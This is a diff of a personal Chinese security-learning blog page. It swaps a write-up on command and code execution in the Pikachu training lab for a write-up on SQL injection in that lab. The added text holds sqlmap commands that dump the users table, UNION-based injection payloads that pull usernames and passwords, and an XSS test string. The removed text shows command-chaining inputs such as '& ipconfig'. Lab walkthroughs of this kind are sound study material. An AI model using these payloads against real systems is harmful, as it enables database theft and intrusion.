@@ -16,30 +16,45 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta name="description" content="概述RCE (remote command&#x2F;code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。 远程系统命令执行一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。一般会给用户一个ping操作的web界面，用户从web界面输入目标ip,提交后会对该IP地址进行一次ping测试，并返回测试结果。没有安全控制的话会导致攻击者通">
+    <meta name="description" content="概述数据库注入漏洞 SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略： 1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入 2、使用参数化（Parameterized Query 或 Paramete">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pikachu-RCE">
-<meta property="og:url" content="https://sinky.top/2022/08/11/pikachu-RCE/index.html">
+<meta property="og:title" content="pikachu-SQL注入">
+<meta property="og:url" content="https://sinky.top/2022/08/11/pikachu-SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
-<meta property="og:description" content="概述RCE (remote command&#x2F;code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。 远程系统命令执行一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。一般会给用户一个ping操作的web界面，用户从web界面输入目标ip,提交后会对该IP地址进行一次ping测试，并返回测试结果。没有安全控制的话会导致攻击者通">
+<meta property="og:description" content="概述数据库注入漏洞 SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略： 1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入 2、使用参数化（Parameterized Query 或 Paramete">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://s2.loli.net/2022/08/11/bzJDf953yhviwBW.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/11/3mcQnH1T2xrGCIb.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png">
-<meta property="og:image" content="https://s2.loli.net/2022/08/11/OKkmEnHDoWRN94B.png">
-<meta property="article:published_time" content="2022-08-11T14:17:28.967Z">
-<meta property="article:modified_time" content="2022-08-11T14:33:04.867Z">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/ns6cb125QWuw4K8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/83clNIzeqxQC95R.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/sjbvRBf8hX9Trik.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/cVtYLA9HiWvgpKN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/DHQ1uVzSeAFW62K.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/tj3gv96SDb1eVN7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/cenBE4stSj1IKx7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/12/ZAs93zclEUeLY1q.png">
+<meta property="article:published_time" content="2022-08-11T14:48:34.692Z">
+<meta property="article:modified_time" content="2022-08-12T05:26:17.408Z">
 <meta property="article:author" content="Sinky">
 <meta property="article:tag" content="pikachu">
-<meta property="article:tag" content="RCE">
 <meta property="article:tag" content="WEB">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://s2.loli.net/2022/08/11/bzJDf953yhviwBW.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png">
   
   
   
-  <title>pikachu-RCE - Sinky&#39;s Blog</title>
+  <title>pikachu-SQL注入 - Sinky&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +222,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="pikachu-RCE"></span>
+            <span id="subtitle" data-typed-text="pikachu-SQL注入"></span>
           
         </div>
 
@@ -218,7 +233,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-11 22:17" pubdate>
+        <time datetime="2022-08-11 22:48" pubdate>
           August 11, 2022 pm
         </time>
       </span>
@@ -230,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          629 words
+          4.1k words
         
       </span>
     
@@ -241,7 +256,7 @@
         
         
         
-          6 mins
+          35 mins
         
       </span>
     
@@ -279,33 +294,134 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">pikachu-RCE</h1>
+            <h1 style="display: none">pikachu-SQL注入</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>RCE (remote command/code execute),可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。</p>
-<h2 id="远程系统命令执行"><a href="#远程系统命令执行" class="headerlink" title="远程系统命令执行"></a>远程系统命令执行</h2><p>一般出现这种漏洞是因为应用系统从设计上需要给用户提供指定的远程命令操作接口。一般会给用户一个ping操作的web界面，用户从web界面输入目标ip,提交后会对该IP地址进行一次ping测试，并返回测试结果。没有安全控制的话会导致攻击者通过该接口提交恶意命令，后台执行会控制整个后台服务器。</p>
-<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略</p>
-<pre><code class="hljs">exec "ping"
+                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>数据库注入漏洞</p>
+<p>SQL注入漏洞形成原因：在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到sql语句中后，被当作sql语句的一部分执行，从而导致数据库受损（被脱库、被删除、甚至整个服务器权限沦陷）防止SQL注入漏洞的策略：</p>
+<p>1、对传进SQL语句里面的变量进行过滤，不允许危险字符传入</p>
+<p>2、使用参数化（Parameterized Query 或 Parameterized Statement）</p>
+<h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="https://s2.loli.net/2022/08/11/OxedYC8Z3TW6mhi.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>随便提交，抓包可知，是post方式提交的参数为</p>
+<pre><code class="hljs">id=2&amp;submit=%E6%9F%A5%E8%AF%A2
 </code></pre>
-<p><img src="https://s2.loli.net/2022/08/11/bzJDf953yhviwBW.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
-<p>ping一下本地返回正常。</p>
-<p>输入命令： <code>www.baidu.com &amp; ipconfig</code> 发现可以获取到用户的ip地址。</p>
-<p>“&amp;”的作用是先执行 <code>www.baidu.com</code></p>
-<p>或者： &amp;、&amp;&amp;、|、||、； 等拼接执行命令。</p>
-<pre><code class="hljs">exec "eval"
+<p>使用sqlmap跑post方式时的格式为：</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "&lt;url&gt;" ‐‐data="&lt;post提交的参数&gt;" ‐&lt;参数&gt;
 </code></pre>
-<p><img src="https://s2.loli.net/2022/08/11/3mcQnH1T2xrGCIb.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
-<p>不知道为啥输入什么都报错</p>
-<p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
-<p>看了一下网页代码，啥也没有，查看了后台源代码：</p>
-<p><img src="https://s2.loli.net/2022/08/11/2I6MyJS4YBCxTpW.png" srcset="/img/loading.gif" lazyload alt="图片.png"><br><img src="https://s2.loli.net/2022/08/11/OKkmEnHDoWRN94B.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
-<p>用户输入值直接被带入到<code>eval()</code>函数中进行执行，没有任何安全处理。</p>
-<p>输入 <code>phpinfo(); </code>返回显示了php系统信息。</p>
-<p>eval函数的作用是将字符串当作php代码执行，它允许执行任意 PHP 代码</p>
-<p>它允许执行任意 PHP 代码。</p>
-
+<p>1、使用sqlmap跑数据库</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐‐dbs ‐‐batch
+</code></pre>
+<p>注释：</p>
+<ul>
+<li>‐‐dbms 探测数据库是什么 ‐‐dbms mysql 指定数据库类型为mysql数据库</li>
+<li>‐‐dbs 当用户有权读取时，列出所有的数据库</li>
+<li>‐‐batch 该参数使用后不需要用户输入，将会使用sqlmap给的默认提示走下去</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/08/11/OcN91PyeLSb6dZ2.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>2、查数据库pikachu下的表</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐‐tables ‐‐batch
+</code></pre>
+<p>注释：</p>
+<ul>
+<li>‐D pikachu 指定数据库pikachu</li>
+<li>‐‐tables 当有权限读取pikachu数据库中的表tables时，读取出表</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/08/11/Z5tUei9paG8COwq.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>3、获取表users中的列</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch
+</code></pre>
+<p>注释：</p>
+<ul>
+<li>‐T users 指定表明users</li>
+<li>‐‐colmns 当有权限读取表users中的列的时候读取表users中的列。</li>
+<li><img src="https://s2.loli.net/2022/08/11/HGPmW5npascRi78.png" srcset="/img/loading.gif" lazyload alt="图片.png"></li>
+</ul>
+<p>4、获取列username和password中的字段内容</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_id.php" ‐‐data="id=2&amp;submit=%E6%9F%A5%E8%AF%A2" ‐f ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch
+</code></pre>
+<p>注释：</p>
+<ul>
+<li>‐C username,password 指定读取列username和password中的字段内容</li>
+<li>‐‐dump 抛出前面指定内容</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/08/11/gzPAj4DCbM7aeX5.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><p>1、提交，抓包</p>
+<p>2、提交恒等语句可以查询到所有的数据信息</p>
+<p><img src="https://s2.loli.net/2022/08/11/Mb1gFvQZJKzuoPj.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h1 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h1><p><img src="https://s2.loli.net/2022/08/11/1woM6UtT2yZej4v.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p><img src="https://s2.loli.net/2022/08/11/zGdbRT8eLB5uE2q.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>GET方法取表，抓包：</p>
+<p><img src="https://s2.loli.net/2022/08/11/YCWcI9t8lphZfLj.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>参数返回：<code> GET /pikachu/vul/sqli/sqli_str.php?name=&amp;submit=%E6%9F%A5%E8%AF%A2 HTTP/1.1</code></p>
+<p>使用sqlmap跑：</p>
+<p>1、查数据库</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs 
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/11/oMtHBAC7XWPq5Os.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>2、查表</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐‐dbs ‐‐batch
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/11/e9CPAYrHTNyW7fg.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>3、查列</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐‐columns ‐‐batch
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/11/jImLuBZw6kV9oHe.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>4、查字段</p>
+<pre><code class="hljs">python2 sqlmap.py ‐u "http://localhost/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" ‐‐dbms mysql ‐D pikachu ‐T users ‐C username,password ‐‐dump ‐‐batch
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/12/ns6cb125QWuw4K8.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>为方便用户，提供搜索功能，但是因为没对变量过滤，导致漏洞，分为post get，get型一般用在网站上的搜索，post用于用户名登录，搜索型注入又称文本框注入</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><pre><code class="hljs">$sql="select * from user where password like '%$pwd%' order by password";
+</code></pre>
+<p>%匹配任何字符，这句sql语句就是基于用户输入的pws在users表中找到相应的password。</p>
+<p>如果用户端输入: <code>and 1=1 and '%'=</code><br>则会变成：</p>
+<pre><code class="hljs">$sql="select * from user where password like '%fendo'and 1=1 and '%'='%' order by password";
+</code></pre>
+<p>存在sql注入。<br>题</p>
+<p><img src="https://s2.loli.net/2022/08/12/83clNIzeqxQC95R.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>输入一个单引号’</p>
+<p><img src="https://s2.loli.net/2022/08/12/sjbvRBf8hX9Trik.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>报错，因为单引号导致语句%’没闭合。</p>
+<p>输入 <code>'and 1=1 and '%'='</code> ,此时语句变为：</p>
+<pre><code class="hljs">'%' and 1=1 and '%'='%' order by password
+</code></pre>
+<p><img src="https://s2.loli.net/2022/08/12/cVtYLA9HiWvgpKN.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>还可以：</p>
+<ul>
+<li>%’ and 1=1‐‐’</li>
+<li>‘ and 1=1#</li>
+<li>%’ and 1=1 and ‘%’=’</li>
+</ul>
+<p>可输入 <code>' and 1=1 order by x# </code>通过order by x 确定字段数，输入<code>' and 1=1 order by 3#</code>返回正常页面</p>
+<p>输入<code>order by 4#</code>返回报错，说明字段数为3.</p>
+<p>输入 <code>%' and 1=2 union select 1,2,3#</code></p>
+<p><img src="https://s2.loli.net/2022/08/12/DHQ1uVzSeAFW62K.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>（1）1，2，3都可以回显，输入 %’ and 1=2 union select 1,2,(database())# 可爆出当前使用数据库pikachu</p>
+<p>（2）输入 %’ and 1=2 union select 1,2,table_name from information_schema.columns where table_schema=’pikachu’# 得到<br>pikachu数据库下所有表名。</p>
+<p>（3）选择users表，输入 %’ and 1=2 union select 1,2,column_name from information_schema.columns where table_name=’users’# 得到users表下的所有字段名</p>
+<p>（4）输入 %’ and 1=2 union select 1,2,username from pikachu.users#</p>
+<p>(顶多跟着网上教程做了一遍，挺懵逼的其实。–2020.1.7)</p>
+<h1 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h1><p>xx型注入是什么鬼，看到提示笑死</p>
+<p><img src="https://s2.loli.net/2022/08/12/tj3gv96SDb1eVN7.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>随便输入字符抓个包，是GET型请求，输入特殊字符<code>'"&lt;&gt;666</code>,回显报错.</p>
+<p>尝试闭合一下：<code> #'&gt; &lt;script&gt;alert("XSS")&lt;/script&gt;</code></p>
+<p>哎嗨！成功弹出xss，我真是进步了。</p>
+<p>差点忘记这是sql注入了，输入一下万能恒等式：<code> ' and 1=1 '%'='</code></p>
+<p>回显报错，有戏，但是接下来要怎么构造呢？我先看一下前端代码吧。这是从url那个name去获取到输入的，前端代码没啥用，我去看一下后台吧。</p>
+<p><img src="https://s2.loli.net/2022/08/12/cenBE4stSj1IKx7.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>应该是这里了，分析一下，没看懂，注意到那个$query后面的一串字符串，尝试了几个，失败，果断不浪费时间找wp<br>吧。</p>
+<p>1、传输方式为get，传输参数为<code> name=a&amp;submit=%E6%9F%A5%E8%AF%A</code></p>
+<p>2、测试使其闭合的符号：’ ” &lt;&gt;&amp; –+<br>单引号会报错，初步推测使用单引号使其闭合</p>
+<p>3、利用联合查询：<code> a') union select 1,2#</code></p>
+<p>爆出数据库名字：<code> a') union select database(),2 #</code></p>
+<p>爆出<br>users：<code> a') union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' #</code></p>
+<p>查</p>
+<p>列：<code> a') union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #</code></p>
+<p>查字段：<code> a') union select 1,concat(username,password) from pikachu.users #</code></p>
+<p><img src="https://s2.loli.net/2022/08/12/ZAs93zclEUeLY1q.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h1 id="quot-insert-update-quot-注入"><a href="#quot-insert-update-quot-注入" class="headerlink" title="&quot;insert/update&quot;注入"></a><code>"insert/update"</code>注入</h1>
                 
               </div>
             
@@ -319,9 +435,9 @@
       
         <a href="/tags/pikachu/">#pikachu</a>
       
-        <a href="/tags/RCE/">#RCE</a>
-      
         <a href="/tags/WEB/">#WEB</a>
+      
+        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">#SQL注入</a>
       
     </div>
   
@@ -333,8 +449,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>pikachu-RCE</div>
-      <div>https://sinky.top/2022/08/11/pikachu-RCE/</div>
+      <div>pikachu-SQL注入</div>
+      <div>https://sinky.top/2022/08/11/pikachu-SQL注入/</div>
     </div>
     <div class="license-meta">
       
@@ -376,18 +492,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/08/11/%E6%96%B0%E6%96%87%E6%A1%A3/" title="pikachu-SQL注入">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">pikachu-SQL注入</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/08/10/python%E5%AD%A6%E4%B9%A01/" title="Python学习1">
-                        <span class="hidden-mobile">Python学习1</span>
+                      <a href="/2022/08/11/%E6%96%B0%E6%96%87%E6%A1%A3/" title="pikachu-SQL注入">
+                        <span class="hidden-mobile">pikachu-SQL注入</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
